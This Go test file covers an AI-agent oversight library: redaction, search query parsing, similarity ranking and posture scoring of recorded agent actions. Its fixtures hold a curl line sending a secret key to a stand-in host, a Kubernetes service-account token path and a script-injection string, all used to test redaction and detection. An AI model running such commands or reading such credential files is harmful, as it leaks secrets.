/*
Copyright (c) 2026.

MIT License - see LICENSE file for details.
*/

package oversight

import (
	"encoding/json"
	"errors"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	oversightv1 "github.com/orka-agents/orka/pkg/oversight/v1"
	storagev1 "github.com/orka-agents/orka/pkg/storage/v1"
)

var testNow = time.Date(2026, 11, 25, 2, 0, 0, 0, time.UTC)

func decision(id, task string, mutate ...func(*oversightv1.OversightDecision)) oversightv1.OversightDecision {
	d := oversightv1.OversightDecision{
		ID: id, TaskName: task, AgentName: "agent-" + task, ObservedAt: testNow.Add(-time.Hour),
		Mode: oversightv1.ModeAudit, Disposition: oversightv1.DispositionAllow,
		EvidenceLevel: oversightv1.EvidenceLevelObserved,
		Coverage:      oversightv1.ActionCoverage{StreamState: "ok", SensorState: "events"},
		Action: oversightv1.ActionEnvelope{
			ToolName: "code_exec", RequestSummary: "Compute an average",
			Effects: oversightv1.ObservedEffects{
				Counts:   map[string]int{"exec": 1},
				Binaries: []oversightv1.CountedValue{{Value: "/usr/bin/python3", Count: 1}},
			},
		},
		Scorers: []oversightv1.ScorerEvaluation{{ProviderRef: "scorer-a", ModelID: "m", Status: "ok"}},
	}
	for _, m := range mutate {
		m(&d)
	}
	return d
}

func TestPrepareRedactsBoundsAndIndexes(t *testing.T) {
	d := decision("t@0", "t", func(d *oversightv1.OversightDecision) {
		d.Seq, d.RecordedAt = 99, testNow
		d.Action.RequestSummary = "use Authorization: Bearer abc.def.ghi"
		d.Action.ToolCallID = "<script>alert(1)</script>"
		d.Action.Effects.Destinations = []oversightv1.CountedValue{{Value: "cdn-lfs.modelhub.test:443", Count: 1}}
		d.Action.Effects.Paths = []oversightv1.CountedValue{{Value: "/var/run/secrets/kubernetes.io/serviceaccount/token", Count: 1}}
		d.Action.Effects.NotableEvents = []oversightv1.EffectEvent{{ID: "e1", Kind: "exec", Args: "curl https://x.example/?key=sk-secret123"}}
		d.Advisors = []oversightv1.AdvisorEvaluation{{ProviderRef: "advisor-a", ModelID: "m2", Status: "ok", Summary: strings.Repeat("é", 3000)}}
		d.CharterFindings = []oversightv1.CharterFinding{{ProducerRef: "rules", BoundID: "B1", Sentence: "No outbound sends after reading a credential."}}
		d.CharterRevision = "charter-r2"
	})
	stored, record, err := Prepare("team", d)
	require.NoError(t, err)
	require.Zero(t, stored.Seq)
	require.True(t, stored.RecordedAt.IsZero(), "the store assigns the recorded time")
	require.NotContains(t, string(record.Body), "abc.def.ghi")
	require.NotContains(t, string(record.Body), "sk-secret123")
	require.NotContains(t, record.SearchText, "abc.def.ghi")
	require.Equal(t, "<script>alert(1)</script>", stored.Action.ToolCallID, "markup is kept as data, never interpreted")
	require.LessOrEqual(t, len(stored.Advisors[0].Summary), oversightv1.MaxAdvisorSummaryBytes)
	require.True(t, strings.HasPrefix(record.Digest, "sha256:"))
	require.Equal(t, "team", record.Namespace)
	require.Contains(t, record.Facets, storagev1.OversightFacet{Kind: "dest_domain", Value: "modelhub.test"})
	require.Contains(t, record.Facets, storagev1.OversightFacet{Kind: "path_prefix", Value: "/var/run/secrets/*"})
	require.Contains(t, record.Facets, storagev1.OversightFacet{Kind: "signal", Value: "against_charter"})
	require.Contains(t, record.Facets, storagev1.OversightFacet{Kind: "bound", Value: "B1"})
	require.Contains(t, record.Facets, storagev1.OversightFacet{Kind: "charter", Value: "charter-r2"}, "a finding's rule is searchable with its charter revision")
	require.Contains(t, record.Facets, storagev1.OversightFacet{Kind: "bin", Value: "python3"})
	require.Contains(t, record.ActionNarrative, "Task t (agent agent-t) ran code_exec")
	require.Contains(t, record.ActionNarrative, "connected to cdn-lfs.modelhub.test:443")

	again, _, err := Prepare("team", d)
	require.NoError(t, err)
	_, second, _ := Prepare("team", again)
	require.Equal(t, record.Digest, second.Digest, "a stored decision prepares to the same digest")

	_, _, err = Prepare("team", decision("", "t"))
	require.ErrorIs(t, err, oversightv1.ErrInvalid)
}

func TestTruncateBytesKeepsWholeRunes(t *testing.T) {
	require.Equal(t, "abc", truncateBytes("abc", 3))
	require.Equal(t, "ab", truncateBytes("abc", 2))
	require.Equal(t, "é", truncateBytes("éé", 3))
	require.Empty(t, truncateBytes("é", 1))
	// A run of 3-byte characters loses only the one that straddles the limit.
	require.Equal(t, "€€", truncateBytes("€€€", 7))
	require.Equal(t, "€€", truncateBytes("€€€", 8))
	require.Equal(t, "€€€", truncateBytes("€€€€", 9))
	require.Equal(t, "日本", truncateBytes("日本語テキスト", 8))
	require.Equal(t, "a😀", truncateBytes("a😀😀", 7))
}

func TestParseQuery(t *testing.T) {
	filter, terms, err := ParseQuery(`dest:*.modelhub.test:* agent:a|b disposition:audit_flagged,fail_closed "token read" https://x.example minScore:0.5 since:24h task:r1-*`, testNow)
	require.NoError(t, err)
	require.Equal(t, []storagev1.OversightFacetMatch{{Kind: "dest", Value: "*.modelhub.test:*", Glob: true}}, filter.Facets)
	require.Equal(t, []string{"a", "b"}, filter.AgentNames)
	require.Equal(t, []string{"audit_flagged", "fail_closed"}, filter.Dispositions)
	require.Equal(t, []string{"token read", "https://x.example"}, filter.Text)
	require.Equal(t, 0.5, *filter.MinScore)
	require.Equal(t, testNow.Add(-24*time.Hour), filter.ObservedSince)
	require.Equal(t, "r1-", filter.TaskPrefix)
	require.Len(t, terms, 8)

	filter, _, err = ParseQuery(`concern:K1|K10 taint:credential_read`, testNow)
	require.NoError(t, err)
	require.Len(t, filter.AnyFacets, 2)
	require.Equal(t, []storagev1.OversightFacetMatch{{Kind: "taint", Value: "credential_read"}}, filter.Facets)

	filter, _, err = ParseQuery(`charter:charter-r2 bound:B1`, testNow)
	require.NoError(t, err)
	require.Equal(t, []storagev1.OversightFacetMatch{{Kind: "charter", Value: "charter-r2"}, {Kind: "bound", Value: "B1"}}, filter.Facets)

	for _, bad := range []string{`disposition:ok`, `minScore:2`, `"open`, `concern:`, `concern:a|b dest:x|y`, `feedback:maybe`, `since:1y`, `task:a*b`} {
		_, _, err := ParseQuery(bad, testNow)
		require.Truef(t, errors.Is(err, ErrQuery), "%s: %v", bad, err)
	}
	_, _, err = ParseQuery(strings.Repeat("a ", MaxQueryTerms+1), testNow)
	require.ErrorIs(t, err, ErrQuery)
}

func view(t *testing.T, seq int64, d oversightv1.OversightDecision, label oversightv1.FeedbackLabel) oversightv1.DecisionView {
	t.Helper()
	_, record, err := Prepare("team", d)
	require.NoError(t, err)
	record.Seq = seq
	var feedback *storagev1.OversightFeedbackRecord
	if label != "" {
		feedback = &storagev1.OversightFeedbackRecord{Label: string(label)}
	}
	v, err := View(record, feedback)
	require.NoError(t, err)
	return v
}

func TestRankSimilarExplainsMatches(t *testing.T) {
	hf := func(dest string) func(*oversightv1.OversightDecision) {
		return func(d *oversightv1.OversightDecision) {
			d.Action.Effects.Counts["net_connect"] = 1
			d.Action.Effects.Destinations = []oversightv1.CountedValue{{Value: dest, Count: 1}}
		}
	}
	source := view(t, 1, decision("a@0", "a", hf("modelhub.test:443")), "")
	exact := view(t, 2, decision("b@0", "b", hf("modelhub.test:443")), "")
	variant := view(t, 3, decision("c@0", "c", hf("cdn-lfs.modelhub.test:443")), "")
	unrelated := view(t, 4, decision("d@0", "d", func(d *oversightv1.OversightDecision) {
		d.Action.ToolName = "file_write"
		d.Action.Effects = oversightv1.ObservedEffects{}
	}), "")
	items := RankSimilar(source, []oversightv1.DecisionView{source, variant, unrelated, exact}, 10)
	require.Len(t, items, 2)
	require.Equal(t, "b@0", items[0].Decision.ID)
	require.True(t, items[0].ExactSignature)
	require.Equal(t, 1.0, items[0].Score)
	require.Equal(t, "c@0", items[1].Decision.ID)
	require.Less(t, items[1].Score, 1.0)
	require.Contains(t, items[1].Shared, oversightv1.Feature{Kind: "bin", Value: "python3"})

	matches := SimilarCandidates("team", source.Signature())
	require.Contains(t, matches, storagev1.OversightFacetMatch{Kind: "dest_class", Value: "modelhub.test:443"})
	for _, match := range matches {
		require.NotEqual(t, "tool", match.Kind)
	}

	groups := Group([]oversightv1.DecisionView{source, exact, variant, view(t, 5, decision("a@1", "a", hf("x:1")), "")}, "agent")
	require.Equal(t, "agent-a", groups[0].Key)
	require.Equal(t, 2, groups[0].Count)
	require.Equal(t, []string{"a"}, groups[0].Tasks)

	// An agentless decision groups under the empty key, never its Task name,
	// so it cannot merge with an Agent that shares the Task's name.
	agentless := view(t, 6, decision("agent-a@0", "agent-a"), "")
	agentless.AgentName = ""
	groups = Group([]oversightv1.DecisionView{source, agentless}, GroupByAgent)
	require.Len(t, groups, 2)
	require.Equal(t, "agent-a", groups[0].Key)
	require.Equal(t, 1, groups[0].Count)
	require.Empty(t, groups[1].Key)
	require.Equal(t, []string{"agent-a"}, groups[1].Tasks)
}

func TestPostureIsHonestByConstruction(t *testing.T) {
	clean := view(t, 1, decision("a@0", "a"), "")
	t.Run("an empty window is blind", func(t *testing.T) {
		p := ComputePosture("team", "24h", testNow, nil, false)
		require.Equal(t, oversightv1.ConfidenceBlind, p.Confidence.State)
		require.Equal(t, oversightv1.VisibilityBlind, p.Visibility.State)
	})
	t.Run("audit mode is never warranted, even when fully visible", func(t *testing.T) {
		p := ComputePosture("team", "24h", testNow, []oversightv1.DecisionView{clean}, false)
		require.Equal(t, oversightv1.VisibilityFull, p.Visibility.State)
		require.Equal(t, oversightv1.ControlNotEnforced, p.Control.State)
		require.Equal(t, oversightv1.ConfidenceDegraded, p.Confidence.State)
		require.Contains(t, p.Confidence.Reasons, ReasonAuditMode)
	})
	t.Run("gate mode without canaries is still not warranted", func(t *testing.T) {
		gated := view(t, 1, decision("a@0", "a", func(d *oversightv1.OversightDecision) { d.Mode = oversightv1.ModeGate }), "")
		p := ComputePosture("team", "24h", testNow, []oversightv1.DecisionView{gated}, false)
		require.Equal(t, oversightv1.ControlEnforced, p.Control.State)
		require.Equal(t, oversightv1.ConfidenceDegraded, p.Confidence.State)
		require.Equal(t, []string{ReasonCanariesNotReported}, p.Confidence.Reasons)
	})
	t.Run("blind spots and unattributed events lower visibility", func(t *testing.T) {
		blind := view(t, 2, decision("b@0", "b", func(d *oversightv1.OversightDecision) {
			d.Coverage.UnattributedEvents = 11
			d.Coverage.BlindSpots = []string{"shared_runtime_pool"}
		}), "")
		p := ComputePosture("team", "24h", testNow, []oversightv1.DecisionView{clean, blind}, false)
		require.Equal(t, oversightv1.VisibilityPartial, p.Visibility.State)
		require.Contains(t, p.Visibility.Reasons, ReasonUnattributedEvents)
		require.Contains(t, p.Visibility.Reasons, ReasonBlindSpots)
		require.Equal(t, 11, p.Basis.Coverage.UnattributedEvents)
		require.Equal(t, 2, p.Basis.Coverage.ObservedEvents, "one exec in each of the two actions")
		require.Nil(t, p.Basis.Coverage.Excluded)
	})
	t.Run("incomplete kernel evidence is counted and left out of clean coverage", func(t *testing.T) {
		gap := func(id string, spots ...string) oversightv1.DecisionView {
			return view(t, 6, decision(id, "gap", func(d *oversightv1.OversightDecision) { d.Coverage.BlindSpots = spots }), "")
		}
		views := []oversightv1.DecisionView{
			clean,
			gap("g@0", "evidence-incomplete:no-workload-exec"),
			gap("g@1", "evidence-incomplete:no-workload-exec", "evidence-incomplete:late-exec"),
			gap("g@2", "shared_runtime_pool"),
		}
		p := ComputePosture("team", "24h", testNow, views, false)
		require.Equal(t, 4, p.Basis.Coverage.SensorAttributed)
		require.Equal(t, 2, p.Basis.Coverage.EvidenceIncomplete, "counted once per action")
		require.Equal(t, 2, p.Basis.Coverage.CleanlyCovered)
		require.Equal(t, 2, p.Basis.Coverage.BlindSpots["evidence-incomplete:no-workload-exec"])
		require.Contains(t, p.Visibility.Reasons, ReasonBlindSpots)
		require.Contains(t, p.Visibility.Summary, "2 actions with incomplete kernel evidence")

		p = ComputePosture("team", "24h", testNow, []oversightv1.DecisionView{clean}, false)
		require.Equal(t, 1, p.Basis.Coverage.CleanlyCovered)
		require.Zero(t, p.Basis.Coverage.EvidenceIncomplete)
	})
	t.Run("decision latency leaves backfilled records out", func(t *testing.T) {
		at := func(id string, observed, recorded time.Duration) oversightv1.DecisionView {
			v := view(t, 4, decision(id, "lat", func(d *oversightv1.OversightDecision) {
				d.ObservedAt = testNow.Add(observed)
			}), "")
			v.RecordedAt = testNow.Add(recorded)
			return v
		}
		views := []oversightv1.DecisionView{
			at("old@0", -6*time.Hour, -time.Hour), // seeded history, recorded later in one batch
			at("live@0", -50*time.Minute, -50*time.Minute+2*time.Second),
			at("live@1", -40*time.Minute, -40*time.Minute+4*time.Second),
			at("live@2", -30*time.Minute, -30*time.Minute+10*time.Second),
		}
		p := ComputePosture("team", "24h", testNow, views, false)
		require.Equal(t, &oversightv1.LatencySummary{Count: 3, P50Seconds: 4, P95Seconds: 10, MaxSeconds: 10}, p.Basis.DecisionLatency)
		require.Nil(t, ComputePosture("team", "24h", testNow, views[:1], false).Basis.DecisionLatency,
			"a window of only backfilled records has no latency to report")
	})
	t.Run("decision latency leaves replayed records out and counts them", func(t *testing.T) {
		at := func(id string, observed, recorded time.Duration, replayed bool) oversightv1.DecisionView {
			v := view(t, 5, decision(id, "rep", func(d *oversightv1.OversightDecision) {
				d.ObservedAt = testNow.Add(observed)
				d.Replayed = replayed
			}), "")
			v.RecordedAt = testNow.Add(recorded)
			return v
		}
		replays := []oversightv1.DecisionView{
			at("r@0", -20*time.Minute, -20*time.Minute, true),
			at("r@1", -10*time.Minute, -10*time.Minute, true),
		}
		all := ComputePosture("team", "24h", testNow, replays, false).Basis.DecisionLatency
		require.Equal(t, &oversightv1.LatencySummary{ReplayedCount: 2}, all, "only replays: no figure, and why")
		mixed := append(slices.Clone(replays), at("l@0", -5*time.Minute, -5*time.Minute+3*time.Second, false))
		require.Equal(t, &oversightv1.LatencySummary{Count: 1, ReplayedCount: 2, P50Seconds: 3, P95Seconds: 3, MaxSeconds: 3},
			ComputePosture("team", "24h", testNow, mixed, false).Basis.DecisionLatency)
		require.Equal(t, 2, ComputePosture("team", "24h", testNow, mixed, false).Basis.ReplayedActions)
		require.Equal(t, 1, ComputePosture("team", "24h", testNow, mixed, false).Basis.Coverage.ObservedEvents,
			"only the live action's exec counts as an observed event")
		var missing oversightv1.OversightDecision
		require.NoError(t, json.Unmarshal([]byte(`{"id":"x@0"}`), &missing))
		require.False(t, missing.Replayed, "a record without the field is live")
	})
	t.Run("excluded events are counted once per Task", func(t *testing.T) {
		withExcluded := func(id, task string, platform int) oversightv1.DecisionView {
			return view(t, 3, decision(id, task, func(d *oversightv1.OversightDecision) {
				d.Coverage.AttributionCounts = map[string]int{"excluded_platform_traffic": platform, "excluded_container_setup": 4,
					"owner-chain": 9, "excluded_": 7, "excluded_negative": -1}
			}), "")
		}
		views := []oversightv1.DecisionView{withExcluded("a@0", "a", 2), withExcluded("a@1", "a", 3), withExcluded("b@0", "b", 1)}
		p := ComputePosture("team", "24h", testNow, views, false)
		require.Equal(t, map[string]int{"platform_traffic": 4, "container_setup": 8}, p.Basis.Coverage.Excluded)
	})
	t.Run("a missing stream or unavailable sensor is blind", func(t *testing.T) {
		missing := view(t, 2, decision("b@0", "b", func(d *oversightv1.OversightDecision) { d.Coverage.SensorState = "unavailable" }), "")
		p := ComputePosture("team", "24h", testNow, []oversightv1.DecisionView{clean, missing}, false)
		require.Equal(t, oversightv1.ConfidenceBlind, p.Confidence.State)
	})
	t.Run("charter findings and fail-closed need attention until labelled false alarms", func(t *testing.T) {
		against := decision("c@0", "c", func(d *oversightv1.OversightDecision) {
			d.CharterFindings = []oversightv1.CharterFinding{{ProducerRef: "rules", BoundID: "B1", Sentence: "No sends."}}
		})
		failed := decision("d@0", "d", func(d *oversightv1.OversightDecision) { d.Disposition = oversightv1.DispositionFailClosed })
		p := ComputePosture("team", "24h", testNow, []oversightv1.DecisionView{clean, view(t, 3, against, ""), view(t, 4, failed, "")}, false)
		require.Equal(t, oversightv1.ConfidenceAttentionRequired, p.Confidence.State)
		require.Equal(t, []string{ReasonAgainstCharter, ReasonHeldOrFailClosed}, p.Confidence.Reasons)
		require.Equal(t, 1, p.Basis.CharterFindings)
		require.Equal(t, 2, p.Basis.Unreviewed)

		p = ComputePosture("team", "24h", testNow, []oversightv1.DecisionView{
			clean, view(t, 3, against, oversightv1.FeedbackFalseAlarm), view(t, 4, failed, oversightv1.FeedbackFalseAlarm),
		}, false)
		require.Equal(t, oversightv1.ConfidenceDegraded, p.Confidence.State)
		require.Equal(t, 2, p.Basis.FalseAlarms)
	})
	t.Run("a scorer failure and an incomplete read lower visibility", func(t *testing.T) {
		failing := view(t, 2, decision("b@0", "b", func(d *oversightv1.OversightDecision) { d.Scorers[0].Status = "timeout" }), "")
		p := ComputePosture("team", "24h", testNow, []oversightv1.DecisionView{failing}, true)
		require.Equal(t, oversightv1.VisibilityPartial, p.Visibility.State)
		require.Contains(t, p.Visibility.Reasons, ReasonProducerFailures)
		require.Contains(t, p.Visibility.Reasons, ReasonIncomplete)
		require.Equal(t, 1, p.Producers[0].Failures)
	})
}
